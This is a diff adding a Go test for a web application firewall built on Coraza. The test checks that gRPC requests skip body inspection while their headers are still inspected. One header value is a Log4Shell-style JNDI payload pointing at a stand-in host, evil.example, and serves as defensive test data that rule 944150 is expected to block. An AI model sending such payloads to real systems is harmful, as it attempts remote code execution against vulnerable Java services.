@@ -241,6 +241,52 @@ func TestTruncatedBodyIsNotInspected(t *testing.T) {
 	}
 }
 
+// TestGRPCCall: a request the pipeline found to be a gRPC call has its
+// content type allowed and its body left out; its URI and headers are
+// inspected, and other requests keep 920420.
+func TestGRPCCall(t *testing.T) {
+	e, err := New(Config{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	// helloworld.HelloRequest{name: "world"}, framed: NUL bytes, and 0x0a
+	// (the tag of field 1), which CRS reads as a line feed.
+	body := "\x00\x00\x00\x00\x07\x0a\x05world"
+	call := func(grpc bool, extra http.Header) *request.Request {
+		h := http.Header{"Content-Type": {"application/grpc"}, "Te": {"trailers"}}
+		maps.Copy(h, extra)
+		r := newRequest("POST", "/helloworld.Greeter/SayHello", h, body)
+		r.Proto = "HTTP/2.0"
+		r.GRPC = grpc
+		return r
+	}
+	for range 2 { // the removal of 920420 doesn't outlive its request
+		res, err := e.Evaluate(context.Background(), call(true, nil))
+		if err != nil {
+			t.Fatal(err)
+		}
+		if res.Interrupted || len(res.MatchedRuleIDs) != 0 {
+			t.Fatalf("gRPC call: %+v, want no match", res)
+		}
+		res, err = e.Evaluate(context.Background(), call(false, nil))
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, id := range []int{920420, 920270, 921150} {
+			if !slices.Contains(res.MatchedRuleIDs, id) {
+				t.Fatalf("not a gRPC call: rules %v, want %d", res.MatchedRuleIDs, id)
+			}
+		}
+	}
+	res, err := e.Evaluate(context.Background(), call(true, http.Header{"X-Token": {"${jndi:ldap://evil.example/a}"}}))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !res.Interrupted || !slices.Contains(res.MatchedRuleIDs, 944150) {
+		t.Fatalf("gRPC call with an attack in its metadata: %+v, want 944150 to block it", res)
+	}
+}
+
 func TestBodyLimitAllowsLargeBodies(t *testing.T) {
 	// Coraza's default SecRequestBodyLimit is 12.5 MiB; with BodyLimit set
 	// higher, a body within the caller's limit is not rejected by Coraza.
